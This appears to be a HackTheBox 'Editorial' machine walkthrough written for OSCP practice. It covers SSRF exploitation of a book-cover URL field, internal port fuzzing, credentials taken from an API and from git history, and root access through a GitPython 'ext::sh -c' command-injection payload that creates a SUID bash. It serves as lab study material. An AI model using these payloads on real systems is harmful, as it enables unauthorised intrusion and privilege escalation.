---
author: "0xt0pus"
title: "HackTheBox Editorial machine Walkthrough"
date: "2025-01-25"
description: " "
tags: ["Hackthebox", "CVE","OSCP-Preparation", "Machine-Walkthrough"]
cover:
    image: "/writeups/Editorial-HackTheBox/Cover.png"
ShowToc: true
TocOpen: false
---



## Enumeration

### Scanning with nmap
All port scanning is being perform with the following command:

```
nmap -p- --min-rate 2500 10.10.11.20 -oN allports.txt
```

The following shows the result of the command:

![](/writeups/Editorial-HackTheBox/1.png)

It shows port 22, 80 as open. In order to find the version of services, service version enumeration is being performed with the following command. 

```
nmap -p 22,80 10.10.11.20 -sC -sV -O -oN serviceVersion.txt
```

![](/writeups/Editorial-HackTheBox/2.png)



As the web server is running, so the website is being browsed and the following is the hosted web server. 
![](/writeups/Editorial-HackTheBox/3.png)




The following email found, but it was of no use.  
submissions@tiempoarriba.htb

### Directory Enumeration: 

Dirsearch is being used for enumerating all the available directories in the target server.

Command:
```
dirsearch http://editorial.htb/
```

![](/writeups/Editorial-HackTheBox/4.png)
As shown, the two directories `/about` and `/upload` are being found.

The `/upload` directory has a form to upload the book information. 
![](/writeups/Editorial-HackTheBox/5.png)

Tried the file upload vulnerability in the file upload. But it is not rendering the uploaded file in the web page, instead, it is serving the uploaded file for downloading. 

There's another option to upload the URL of the book cover. This feature has an SSRF vulnerability. 
This can be confirmed by running a `nc` listener, and sending request to our own listener in the book cover URL as shown below:
![](/writeups/Editorial-HackTheBox/6.png)


A request can be sent to the internal server to get information from there. So, a request is being sent to `127.0.0.1:80` as shown:

It takes a bit of time, and responded with a jpeg file. For enumerating other ports, I tried enumerating a few other ports, but all were giving the same jpeg file as shown:
![](/writeups/Editorial-HackTheBox/7.png)


### Enumerating the Open Ports in the Internal Server with FFUF:

Replaced the port number in burp with `FUZZ` as shown below:
![](/writeups/Editorial-HackTheBox/8.png)

Saved the burp request in file called `req.txt` and run ffuf with the following command:

```
ffuf -request req.txt -request-proto http -w <(seq 1 65535) -fr "1630734277837_ebe62757b6e0.jpeg"
```

This will use the req.txt to fuzz the port with the wordlist of sequence from 1 to 65535 and will not show all the responses containing the regex `1630734277837_ebe62757b6e0.jpeg`. 

Port 5000 was sending a different response. That means, this port is open. 

Sent request to port 5000 as shown below:
![](/writeups/Editorial-HackTheBox/9.png)

It gave me a URL to download a file. 

![](/writeups/Editorial-HackTheBox/10.png)

The file contains a list of end points. I sent request to the `/api/latest/metadata/messages/authors` endpoint, which again gave ma another URL. I visited that URL and got a password of `dev` user as shown:
![](/writeups/Editorial-HackTheBox/11.png)

### Getting Access of the Machine

The password was used to get access of the machine through SSH as the `dev` user. 

### Literal Movement:

The `apps` directory has a .git directory, which contains the different version of the code. 

There were different files which were stagged but not committed as shown:

Command Used:
```
git status
```

![](/writeups/Editorial-HackTheBox/12.png)

The log of git showed interesting commit with message `downgrading prod to dev`:
Command Used:
```
git log
```

![](/writeups/Editorial-HackTheBox/13.png)


This commit is being shown with the command:

```
git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
```

![](/writeups/Editorial-HackTheBox/14.png)

This showed the password of `prod` user as shown. 

### Privilege Escalation

There's an script, which the prod user can run as the root user as shown:
![](/writeups/Editorial-HackTheBox/15.png)

The following is the content of file:
```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

Here, the git module has the vulnerability. I searched about python git priv esc and got this:
https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858

The following can be supplied as the argument to the script for executing command as root:
```
ext::sh -c touch% /tmp/pwned
```

This will create `/tmp/pwned`. 
So, in order to exploit this i run this command, which will copy the root shell and will set its suid bit, we can use that shell later to get root access. 

```python
ext::sh -c cp /bin/bash /tmp/bash; chmod +s /tmp/bash

# we have to add % before each space so it will be like this

ext::sh -c cp% /bin/bash% /tmp/bash;% chmod% +s% /tmp/bash

# The final payload will be:

/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cp% /bin/bash% /tmp/bash;% chmod% +s% /tmp/bash'
```

The following shows the result of this command:

![](/writeups/Editorial-HackTheBox/1.png)
It displayed some kind of error, but we can ignore that as our code executed already. 
I used the following command to interact with the shell and get access as root:
```
/tmp/bash -p
```


Hence, the machine is ROOTED!

